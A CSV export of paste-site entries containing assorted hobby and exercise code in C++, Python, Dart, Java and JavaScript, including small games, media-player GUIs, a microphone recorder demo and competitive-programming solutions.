id,title,username,language,date,content
TLMHqXBZ,f3q3f2,amigo__,C++,Thursday 29th of February 2024 06:34:47 AM CDT,"#include <bits/stdc++.h>

using namespace std;

typedef long long ll;

ll findDayOfWeek(ll d1, ll m1, ll y1, ll t, ll d2, ll m2, ll y2, vector<ll> v, ll l, ll daysInYear, ll n) {
    if (y1 < y2) {
        // двигаем день недели в последний день месяца
        t = (t + v[m1 - 1] - d1) % (l);
        if (t == 0) t = l;

        // идем до последнего дня года прыгая по месяцам
        for (int i = 1; i <= n - m1; i++) {
            t = (t + v[m1 - 1 + i]) % (l);
            if (t == 0) t = l;
        }
        m1 = n;
        d1 = v[m1 - 1];

        // идем до последнего дня года y2-1 прыгая по годам
        for (ll y = y1 + 1; y < y2; y++) {
            t = (t + daysInYear) % (l);
            if (t == 0) t = l;
        }

        // прыгаем в году y2 по месяцам до месяца m2-1
        // потом встаем в последний день месяца m2-1
        for (int i = 1; i < m2; i++) {
            t = (t + v[i - 1]) % (l);
            if (t == 0) t = l;
        }

        // прыгаем в день d2
        t = (t + d2) % (l);
        if (t == 0) t = l;
    } else if (y1 == y2) {
        if (m1 != m2) {
            // двигаем день недели в последний день месяца
            t = (t + v[m1 - 1] - d1) % (l);
            if (t == 0) t = l;

            // прыгаем в году y2 по месяцам до месяца m2-1
            // потом встаем в последний день месяца m2-1
            for (ll i = m1 + 1; i < m2; i++) {
                t = (t + v[i - 1]) % (l);
                if (t == 0) t = l;
            }

            // прыгаем в день d2
            t = (t + d2) % (l);
            if (t == 0) t = l;
        } else {
            // прыгаем в день d2
            t = (t + d2 - d1) % (l + 1);
            if (t == 0) t++;
        }
    }

    return t;
}

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);

    ll n, l;
    cin >> n >> l;

    vector<ll> v(n);
    ll daysInYear = 0;
    for (int i = 0; i < n; i++) {
        cin >> v[i];
        daysInYear += v[i];
    }

    ll d1, m1, y1, t;
    cin >> d1 >> m1 >> y1 >> t;

    ll d2, m2, y2;
    cin >> d2 >> m2 >> y2;

    ll result = 0;
    int c = 0;
    if (y1 < y2) {
        c = 1;
    } else if (y1 > y2) {
        c = -1;
    } else {
        if (m1 < m2) {
            c = 1;
        } else if (m1 > m2) {
            c = -1;
        } else {
            if (d1 < d2) {
                c = 1;
            } else if (d1 > d2) {
                c = -1;
            } else {
                c = 0;
            }
        }
    }

    if (c == 1) {
        t = findDayOfWeek(d1, m1, y1, t, d2, m2, y2, v, l, daysInYear, n);
    } else if (c == -1) {
        ll t2 = findDayOfWeek(d2, m2, y2, 1, d1, m1, y1, v, l, daysInYear, n);
        if (t2 == t) {
            t = 1;
        } else if (t2 < t) {
            t = 1 + (t - t2);
        } else {
            t = l - (t2 - t - 1);
        }
    }

    cout << t;

    return 0;
}
"
RnPqqxAi,Untitled,phatboislym,Python,Thursday 29th of February 2024 06:21:18 AM CDT,"# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right

def traverse(root) -> list[list[int]]:
    nodes: list[list[int]] = []

    def helper(node: Optional[TreeNode], level: int):
        if node:
            if nodes.__len__() == level:
                nodes.append([])

        if node.left:
            nodes[level].append(node.left.val)
            helper(node.left, level + 1)
        
        if node.right:
            nodes[level].append(node.right.val)
            helper(node.right, level + 1)

    helper(root, 0); 

    return nodes


class Solution:
    def isEvenOddTree(self, root: Optional[TreeNode]) -> bool:
        nodes: list[list[int]] = [] 

        if root: 
            nodes = [[root.val]] + traverse(root)
            nodes.pop()
        else:
            return False

        for i in range(nodes.__len__()):
            level: list[int] = nodes[i]

            if i % 2: 
                if level[0] % 2:
                    return False 
                for j in range(level.__len__() - 1):
                    if level[j] <= level[j + 1] or level[j] % 2 or level[j + 1] % 2: 
                        return False
            else:
                if level[0] % 2 == 0:
                    return False 
                for j in range(level.__len__() - 1):
                    if level[j] >= level[j + 1] or level[j] % 2 == 0 or level[j + 1] % 2 == 0:
                        return False
        return True    "
AwggPQQ0,YOUTUBE-PLAYER.py,Najeebsk,Python,Thursday 29th of February 2024 06:20:57 AM CDT,"import tkinter as tk
import vlc
from pytube import YouTube
from threading import Thread

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Add this line for Windows support
        self.player = self.instance.media_player_new()

        self.frame = tk.Frame(root)
        self.frame.pack(side=""left"", fill=""both"", expand=True)

         # Title Label
        self.title_label = tk.Label(self.frame, text=""Najeeb's YouTube Player"", font=(""Helvetica"", 16, ""bold""))
        self.title_label.pack()


        self.player_frame = tk.Frame(root, width=800, height=600)  # Video frame size
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.status_label = tk.Label(self.frame, text="""", fg=""green"")
        self.status_label.pack()

        self.control_frame = tk.Frame(self.frame)
        self.control_frame.pack(side=""bottom"", fill=""x"")

        self.play_button = tk.Button(self.control_frame, text=""Play"", command=self.play_video)
        self.play_button.pack(side=""left"", padx=5)

        self.stop_button = tk.Button(self.control_frame, text=""Stop"", command=self.stop_video)
        self.stop_button.pack(side=""left"", padx=5)

        self.fullscreen_button = tk.Button(self.control_frame, text=""Full Screen"", command=self.toggle_fullscreen)
        self.fullscreen_button.pack(side=""left"", padx=5)

        self.time_slider = tk.Scale(self.control_frame, from_=0, to=100, orient=""horizontal"", command=self.set_video_position)
        self.time_slider.pack(side=""left"", fill=""x"", expand=True)

        self.lst = tk.Listbox(self.frame, width=15, height=20)
        self.lst.pack(side=""bottom"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.lst, orient=""vertical"")
        self.scrollbar.config(command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")

        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.lst.bind(""<<ListboxSelect>>"", self.play_selected_video)
        self.read_youtube_list()

        self.player.event_manager().event_attach(vlc.EventType.MediaPlayerTimeChanged, self.update_time_slider)

    def read_youtube_list(self):
        try:
            with open(""YOUTUBE-LIST.txt"", ""r"") as file:
                urls = file.readlines()
                for url in urls:
                    parts = url.strip().split(""="")
                    if len(parts) >= 2:  
                        name = parts[0]
                        self.lst.insert(tk.END, name)
        except FileNotFoundError:
            self.status_label.config(text=""YOUTUBE-LIST.txt not found"", fg=""red"")

    def play_selected_video(self, event):
        selection = self.lst.curselection()
        if selection:
            name = self.lst.get(selection[0])
            self.play_youtube_video(name)

    def play_video(self):
        self.player.play()
        self.status_label.config(text=""Playing"", fg=""green"")

    def stop_video(self):
        self.player.stop()
        self.status_label.config(text=""Stopped"", fg=""red"")

    def set_video_position(self, value):
        self.player.set_position(float(value) / 100)

    def update_time_slider(self, event):
        position = self.player.get_position()
        self.time_slider.set(int(position * 100))

    def play_youtube_video(self, name):
        self.status_label.config(text=""Loading..."")
        self.root.update()
        video_thread = Thread(target=self.play_youtube_video_thread, args=(name,))
        video_thread.start()

    def play_youtube_video_thread(self, name):
        try:
            with open(""YOUTUBE-LIST.txt"", ""r"") as file:
                urls = file.readlines()
                for url in urls:
                    parts = url.strip().split(""="")
                    if len(parts) >= 2 and parts[0] == name:
                        link = ""="".join(parts[1:])  
                        video = YouTube(link)
                        video_stream = video.streams.filter(res=""360p"").first()
                        media = self.instance.media_new(video_stream.url)
                        self.player.set_media(media)

                        if self.player_frame.winfo_children():
                            self.player_frame.winfo_children()[0].destroy()

                        self.player_frame.update()
                        self.player.set_hwnd(self.player_frame.winfo_id())
                        self.player.play()

                        self.status_label.config(text=""Playing"", fg=""green"")
                        return

            self.status_label.config(text=""Video not found"", fg=""red"")

        except Exception as e:
            self.status_label.config(text=""Failed to play"", fg=""red"")

    def toggle_fullscreen(self):
        if self.root.attributes('-fullscreen'):
            self.root.attributes('-fullscreen', False)
            self.fullscreen_button.config(text=""Full Screen"")
        else:
            self.root.attributes('-fullscreen', True)
            self.fullscreen_button.config(text=""Exit Full Screen"")

root = tk.Tk()
root.title(""NAJEEB YOUTUBE PLAYER"")
root.geometry(""800x600+300+50"")
video_player = VideoPlayer(root)
root.mainloop()
"
kYTUfnKg,snake,nirajs,Python,Thursday 29th of February 2024 06:18:51 AM CDT,"
from collections import deque
from enum import Enum
from abc import ABC, abstractmethod

class Direction(Enum):
    LEFT = ""L""
    RIGHT = ""R""
    UP = 'U'
    DOWN = 'D'


class SnakeGameInterface(ABC):
    @abstractmethod
    def move(self, dir: str) -> int:
        pass

class SnakeGame(SnakeGameInterface):

    def __init__(self, width: int, height: int, foodList: list[list[int]]):
        self.row = width
        self.col = height
        self.foodList = deque(foodList)
        self.snakePath = deque([(0,0)])
        self.score = 0
        self.direction = {
            Direction.LEFT: (-1,0),
            Direction.RIGHT: (0,1),
            Direction.UP: (0,-1),
            Direction.DOWN: (0,1)
        }

    def move(self, dir: str) -> int:
        try:
            dx, dy = self.direction[Direction(dir)]
        except:
            raise ""Invalid Direction""
        head_x, head_y = self.snakePath[0]
        head = (dx + head_x, dy + head_y)

        if (self.collision(head) == True):
            return -1

        if (self.foodList) and list(head) == self.foodList[0]:
            self.score += 1
            self.foodList.popleft()
        else:
            self.snakePath.pop()

        self.snakePath.appendleft(head)
        return self.score

    def collision(self, head) -> bool:
        if (head[0] < 0 or head[0] >= self.row or head[1] < 0 or head[1] >= self.col):
            return True

        return False


width , height = 3,3,
foodList = [[0,1], [0,2]]
snake = SnakeGame(3,3, foodList)
print(snake.move(""R""))


"
t5MHgYU1,VLC-PLAYER.py,Najeebsk,Python,Thursday 29th of February 2024 06:18:11 AM CDT,"import tkinter as tk
import vlc

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  
        self.player = self.instance.media_player_new()
        self.player.set_fullscreen(True)

        self.main_frame = tk.Frame(root)
        self.main_frame.pack(fill=""both"", expand=True)

        # Add big title label with custom font and color
        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=""blue"")
        self.title_label.pack(pady=10)

        self.list_frame = tk.Frame(self.main_frame)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"")
        self.scrollbar.config(command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")

        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_video)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_video)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.player_position = tk.Scale(self.button_frame, from_=0, to=100, orient=""horizontal"", command=self.set_position, length=400)  # Adjust the length as needed
        self.player_position.pack(side=""left"", fill=""x"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"")
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        self.insert_files()

    def insert_files(self):
        try:
            with open('VIDEOS.txt', 'r') as file:
                self.video_list = []
                for line in file:
                    line = line.strip()
                    if line.startswith(""Title:""):
                        title = line.split("": "")[1]
                        self.lst.insert(tk.END, title)
                        self.video_list.append(title)
                    elif line:
                        setattr(self, title, line)  # Store filepath as an attribute
        except FileNotFoundError:
            print(""VIDEOS.txt not found."")

    def play_video(self):
        if self.player.get_state() == vlc.State.Ended:
            self.player.stop()
        self.player.play()
        self.current_video_label.config(text=""Video playing"")

    def show_video(self, event):
        n = self.lst.curselection()
        if n:
            title = self.lst.get(n[0])
            filepath = getattr(self, title, None)
            if filepath:
                media = self.instance.media_new(filepath)
                self.player.set_media(media)

                if self.player_frame.winfo_children():
                    self.player_frame.winfo_children()[0].destroy()

                self.player_frame.update()
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.play_video()  # Automatically play the video when selected
                self.current_video_label.config(text=""Current video: "" + title)

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def prev_video(self):
        current_index = self.video_list.index(self.lst.get(tk.ACTIVE))
        prev_index = current_index - 1 if current_index > 0 else len(self.video_list) - 1
        self.lst.selection_clear(0, tk.END)
        self.lst.selection_set(prev_index)
        self.lst.activate(prev_index)
        self.show_video(None)

    def next_video(self):
        current_index = self.video_list.index(self.lst.get(tk.ACTIVE))
        next_index = (current_index + 1) % len(self.video_list)
        self.lst.selection_clear(0, tk.END)
        self.lst.selection_set(next_index)
        self.lst.activate(next_index)
        self.show_video(None)

    def set_position(self, value):
        self.player.set_position(float(value) / 100)

root = tk.Tk()
root.geometry(""800x600+300+50"")
#root.config(bg='green')
root.title(""Najeeb VLC Player"")
video_player = VideoPlayer(root)
root.mainloop()
"
Z926JGi1,Untitled,DVS_studio,Dart,Thursday 29th of February 2024 06:17:54 AM CDT,"import 'dart:async';
import 'dart:html';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:just_audio/just_audio.dart';

class _Recorder {
  MediaRecorder? _mediaRecorder;
  List<Blob>? _audioBlobParts;
  String? _recordingUrl;

  Future<void> init() async {
    assert(_mediaRecorder == null);

    final stream =
        await window.navigator.mediaDevices?.getUserMedia({'audio': true});
    if (stream == null) return;
    _mediaRecorder = MediaRecorder(stream);

    _audioBlobParts = [];
    _mediaRecorder!.addEventListener('dataavailable', _onDataAvailable);
  }

  void _onDataAvailable(Event event) {
    final blobEvent = event as BlobEvent;
    _audioBlobParts!.add(blobEvent.data!);
  }

  Future<void> start() async {
    assert(_mediaRecorder != null);

    _mediaRecorder!.start();
  }

  /// Stops the recorder and returns an URL pointing to the recording.
  Future<String> stop() async {
    assert(_mediaRecorder != null);
    assert(_recordingUrl == null);

    final completer = Completer<String>();

    void onStop(_) {
      assert(_audioBlobParts != null);

      final blob = Blob(_audioBlobParts!);
      _audioBlobParts = null;

      completer.complete(Url.createObjectUrl(blob));
    }

    _mediaRecorder!.addEventListener('stop', onStop);
    _mediaRecorder!.stop();
    _recordingUrl = await completer.future;
    _mediaRecorder!.removeEventListener('stop', onStop);

    return _recordingUrl!;
  }

  Future<Uint8List> toBytes() async {
    assert(_recordingUrl != null);

    final result = await http.get(Uri.parse(_recordingUrl!));
    return result.bodyBytes;
  }

  void dispose() {
    assert(_mediaRecorder != null);

    _mediaRecorder!.removeEventListener('dataavailable', _onDataAvailable);
    _mediaRecorder = null;
  }
}

void main() {
  runApp(const MicrophoneExampleApp());
}

class MicrophoneExampleApp extends StatefulWidget {
  /// Constructs [MicrophoneExampleApp].
  const MicrophoneExampleApp({super.key});

  @override
  State<MicrophoneExampleApp> createState() => _MicrophoneExampleAppState();
}

class _MicrophoneExampleAppState extends State<MicrophoneExampleApp> {
  _Recorder? _recorder;
  AudioPlayer? _audioPlayer;

  @override
  void dispose() {
    _recorder?.dispose();
    _audioPlayer?.dispose();
    super.dispose();
  }

  Future<void> _initRecorder() async {
    _recorder?.dispose();
    await window.navigator.permissions?.query({'name': 'microphone'});
    _recorder = _Recorder();
    await _recorder!.init();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: Center(
          child: Column(
            children: [
              OutlinedButton(
                onPressed: _initRecorder,
                child: const Text('Restart recorder'),
              ),
              OutlinedButton(
                onPressed: () {
                  _recorder?.start();
                },
                child: const Text('Start recording'),
              ),
              OutlinedButton(
                onPressed: () async {
                  await _recorder?.stop();
                },
                child: const Text('Stop recording'),
              ),
              OutlinedButton(
                onPressed: () async {
                  final bytes = await _recorder?.toBytes();
                  print(bytes);
                },
                child: const Text('To Butes'),
              ),
              OutlinedButton(
                onPressed: () async {
                  _audioPlayer?.dispose();
                  _audioPlayer = AudioPlayer();
                  await _audioPlayer!.setUrl(_recorder!._recordingUrl!);
                  await _audioPlayer!.play();
                },
                child: const Text('Play recording'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
"
qPdiQ3mt,SEARCH-FILES-LIST-TITAL.py,Najeebsk,Python,Thursday 29th of February 2024 06:16:44 AM CDT,"import tkinter as tk
from tkinter import filedialog
import glob
import os

def search_files(extension):
    folder_path = filedialog.askdirectory()
    if folder_path:
        file_list = glob.glob(folder_path + f""/*.{extension}"")
        with open(f""file_list_{extension}.txt"", ""w"") as file:
            for filepath in file_list:
                filename = os.path.basename(filepath)
                file.write(f""Title: {os.path.splitext(filename)[0]}\n{filepath}\n"")
        result_label.config(text=""File list saved successfully!"")

# GUI
root = tk.Tk()
root.title(""Najeeb File Search"")
root.geometry('300x100')


extension_label = tk.Label(root, text=""Enter File Extension Only"")
extension_label.pack()

extension_entry = tk.Entry(root)
extension_entry.pack()

search_button = tk.Button(root, text=""Search"", command=lambda: search_files(extension_entry.get()))
search_button.pack()

result_label = tk.Label(root, text="""")
result_label.pack()

root.mainloop()
"
jyTzX1jN,ROCK PAPER SCISSOR,SenpaiZero,Java,Thursday 29th of February 2024 06:12:28 AM CDT,"import java.util.Random;
import java.util.Scanner;

public class rock_paper_scissor 
{
	private int winsToWinTheMatch;
	public rock_paper_scissor(int winsToWinTheMatch) 
	{
		this.winsToWinTheMatch = winsToWinTheMatch;
	}
	public void start()
	{
		System.out.println(""WELCOME TO ROCK, PAPER AND SCISSOR!"");
		gameplay();
	}
	
	private void gameplay()
	{
		int score = 0, enemyScore = 0, enemyChoice, userChoice;
		Random random = new Random();
		Scanner scanner = new Scanner(System.in);
		
		do
		{
			enemyChoice = random.nextInt(1, 4);
			System.out.println(""Please Choose \n[1] ROCK\n[2] Paper\n[3] SCISSOR\n"");
			System.out.print(""Enter: "");
			String choice = scanner.nextLine();
			String winner = checkWinner(getWeapon(Integer.valueOf(choice)), getWeapon(Integer.valueOf(enemyChoice)));
			if(winner.equals(""PLAYER""))
			{
				System.out.println(""Player is the winner"");
				score++;
			}
			else if(winner.equals(""ENEMY""))
			{
				System.out.println(""Enemy is the winner"");
				enemyScore++;
			}
			else {
				System.out.println(""TIE"");
			}
			
			System.out.println(""\nCURENT SCORE "");
			System.out.println(""Player: "" + score);
			System.out.println(""Enemy: "" + enemyScore);
			System.out.println(""==========================================\n"");
			
			if(winsToWinTheMatch <= score)
			{
				System.out.println(""PLAYER IS THE WINNER OF THE MATCH"");
				break;
			}
			else if(winsToWinTheMatch <= enemyScore)
			{
				System.out.println(""ENEMY IS THE WINNER OF THE MATCH"");
				break;
			}
		} while(true);
	}
	
	private String getWeapon(int weapon)
	{
		if(weapon == 1)
			return ""ROCK"";
		else if(weapon == 2)
			return ""PAPER"";
		else if(weapon == 3)
			return ""SCISSOR"";
		else
			return ""ERROR"";
	}
	private String checkWinner(String playerChoice, String enemyChoice)
	{
		if(playerChoice.equalsIgnoreCase(enemyChoice))
			return ""TIE"";
		else if(playerChoice.equals(""ROCK"") && enemyChoice.equals(""PAPER""))
			return ""ENEMY"";
		else if(playerChoice.equals(""SCISSOR"") && enemyChoice.equals(""ROCK""))
			return ""ENEMY"";
		else if(playerChoice.equals(""PAPER"") && enemyChoice.equals(""SCISSOR""))
			return ""ENEMY"";
		else
			return ""PLAYER"";
	}
}
"
rYdBcYmb,Hangman,SenpaiZero,Java,Thursday 29th of February 2024 06:11:39 AM CDT,"import java.util.Random;
import java.util.Scanner;

public class hangman {
	private int lives;
	private String[] wordsArr;
	private String wordToGuess;
	private String wordToGuess_blanks;
	
	public hangman(int lives, String[] wordsArr)
	{
		this.lives = lives;
		this.wordsArr = wordsArr;
	}
	
	public void play()
	{
		System.out.println(""WELCOME TO HANGMAN!"");
		wordToGuess = randWordGuess().toUpperCase();
		initializeBlanks();
		gameplay();
	}
	
	private void initializeBlanks() 
	{
	    int mid = wordToGuess.length() / 2;
	    StringBuilder blanksBuilder = new StringBuilder(wordToGuess);

	    for (int i = 0; i < mid; i++) 
	    {
	        blanksBuilder.setCharAt(i, '_');
	    }

	    wordToGuess_blanks = blanksBuilder.toString();
	}

	private void updateBlanks(char guess) 
	{
        StringBuilder updatedBlanks = new StringBuilder(wordToGuess_blanks);
        for (int i = 0; i < wordToGuess.length(); i++) {
            if (wordToGuess.charAt(i) == guess) 
                updatedBlanks.setCharAt(i, guess);
        }
        wordToGuess_blanks = updatedBlanks.toString();
    }
	private void gameplay()
	{
		Scanner scanner = new Scanner(System.in);

        do {
            System.out.println(""\nWord to guess: "" + wordToGuess_blanks);
            System.out.print(""Enter a letter: "");
            char guess = scanner.next().toUpperCase().charAt(0);

            if (wordToGuess.contains(String.valueOf(guess))) 
            {
                updateBlanks(guess);
            } 
            else 
            {
                lives--;
                System.out.print(""Incorrect guess! Lives remaining: "" + lives);
                for (int i = 0; i < lives; i++) 
                {
					System.out.print("" ❤"");
				}
                System.out.println();
            }
        } while (!checkDead() && !wordToGuess_blanks.equals(wordToGuess));

        if (wordToGuess_blanks.equals(wordToGuess)) 
            System.out.println(""\nCongratulations! You guessed the word: "" + wordToGuess);
         else 
            System.out.println(""\nOut of lives! The word was: "" + wordToGuess);
	}
	
	private boolean checkDead()
	{
		return lives <= 0;
	}
	
	private String randWordGuess()
	{
		Random random = new Random();
		return wordsArr[random.nextInt(0, wordsArr.length)];
	}
}
"
6aceidDb,data855,TestGuy1,JSON,Thursday 29th of February 2024 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2e363c172d18c91bd1f3f499baa59a0516879b47c98ce91245f9828cc570b5e41d540961ac4c1c1be6b623b53d61e325b64d1663dccf9b8b5027d71e365c165288e1098a62f9b8e78b078585a6829ff5f3573f8a5891e518862c292827a0e7d1512a74d6488f2390b259c62a66ed9dd4b459a1f0b5b0c3e9e5d5f486c7abcdbd',
  otherdata: [
    'bcadb802a68d1a05a4501a6ed114cb73',
    '85c04bd8c5b006ff56859f71b83a4587',
    'c1068a616986b26bd77e8dd98bc040f0',
    'a0509b4c21e6232695872125c9007b4a',
    'ea594e100a8fbcfdcc0416ae06818d20',
    '49fcc95232d442d08087672a8abe309c',
    '4d89dc34c853e41e973a71adb39c07d7',
    'ddb0da1ffa222c4e0b9fb434f38a25c7'
  ]
}"
KzE5iENY,efwef,amigo__,C++,Thursday 29th of February 2024 05:28:10 AM CDT,"#include <bits/stdc++.h>

using namespace std;

typedef unsigned long long ul;

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);

    int n;
    cin >> n;
    unordered_map<int, int> xLeft;
    unordered_map<int, int> xRight;
    unordered_map<int, int> yLeft;
    unordered_map<int, int> yRight;
    unordered_map<int, int> col;
    unordered_map<int, int> row;
    unordered_map<ul, int> board;

    while (n--) {
        int x, y;
        cin >> x >> y;
        int xReverse = 100000000 - x;

        col[x] = (col[x] ?: 0) + 1;
        row[y] = (row[y] ?: 0) + 1;
        ul coords = y * ul(1e9) + x;
        board[coords] = (board[coords] ?: 0) + 1;

        if (y > x) {
            yRight[y - x] = (yRight[y - x] ?: 0) + 1;
        } else {
            xRight[x - y] = (xRight[x - y] ?: 0) + 1;
        }

        if (y > xReverse) {
            yLeft[y - xReverse] = (yLeft[y - xReverse] ?: 0) + 1;
        } else {
            xLeft[xReverse - y] = (xLeft[xReverse - y] ?: 0) + 1;
        }
    }

    int q;
    cin >> q;
    while (q--) {
        char type;
        int x, y;
        int count = 0;
        cin >> type;
        cin >> x >> y;

        if (type == 'K') {
            ul coords = (y + 1) * ul(1e9) + (x - 2);
            count = board[coords] ?: 0;

            coords = (y - 1) * ul(1e9) + (x - 2);
            count += board[coords] ?: 0;

            coords = (y + 1) * ul(1e9) + (x + 2);
            count += board[coords] ?: 0;

            coords = (y - 1) * ul(1e9) + (x + 2);
            count += board[coords] ?: 0;

            coords = (y + 2) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;

            coords = (y + 2) * ul(1e9) + (x - 1);
            count += board[coords] ?: 0;

            coords = (y - 2) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;

            coords = (y - 2) * ul(1e9) + (x - 1);
            count += board[coords] ?: 0;
        }

        if (type == 'P') {
            ul coords = (y + 1) * ul(1e9) + (x - 1);
            count = board[coords] ?: 0;

            coords = (y + 1) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;
        }

        if (type == 'B') {
            int xReverse = 100000000 - x;
            if (y > x) {
                count += yRight[y - x] ?: 0;
            } else {
                count += xRight[x - y] ?: 0;
            }
            if (y > xReverse) {
                count += yLeft[y - xReverse] ?: 0;
            } else {
                count += xLeft[xReverse - y] ?: 0;
            }
        }

        if (type == 'R') {
            count = col[x] ?: 0;
            count += row[y] ?: 0;
        }

        if (type == 'Q') {
            int xReverse = 100000000 - x;
            count = col[x] ?: 0;
            count += row[y] ?: 0;
            if (y > x) {
                count += yRight[y - x] ?: 0;
            } else {
                count += xRight[x - y] ?: 0;
            }
            if (y > xReverse) {
                count += yLeft[y - xReverse] ?: 0;
            } else {
                count += xLeft[xReverse - y] ?: 0;
            }
        }
        cout << count << ""\n"";
    }

    return 0;
}
"
GfKvyC3Y,Untitled,Pijomir,JavaScript,Thursday 29th of February 2024 05:12:18 AM CDT,"const departButtonElement = document.getElementById('depart');
const arriveButtonElement = document.getElementById('arrive');
const infoElement = document.querySelector('#info span');

function solve() {
    let busStopName = '';
    let busStopId = 'depot'
    const url = 'http://localhost:3030/jsonstore/bus/schedule';
    async function depart() {
        try {
            const response = await fetch(`${url}/${busStopId}`);
            if (!response.ok) {
                const errorMessage = await response.json();
                throw errorMessage;
            }

            const data = await response.json();
            busStopId = data.next;
            busStopName = data.name;
            infoElement.textContent = `Next stop ${busStopName}`;
            departButtonElement.disabled = true;
            arriveButtonElement.disabled = false;
        } catch {
            infoElement.textContent = 'Error';
            departButtonElement.disabled = true;
            arriveButtonElement.disabled = true;
        }
    }

    async function arrive() {
        infoElement.textContent = `Arriving at ${busStopName}`;
        departButtonElement.disabled = false;
        arriveButtonElement.disabled = true;
    }

    return {
        depart,
        arrive
    };
}

let result = solve();"
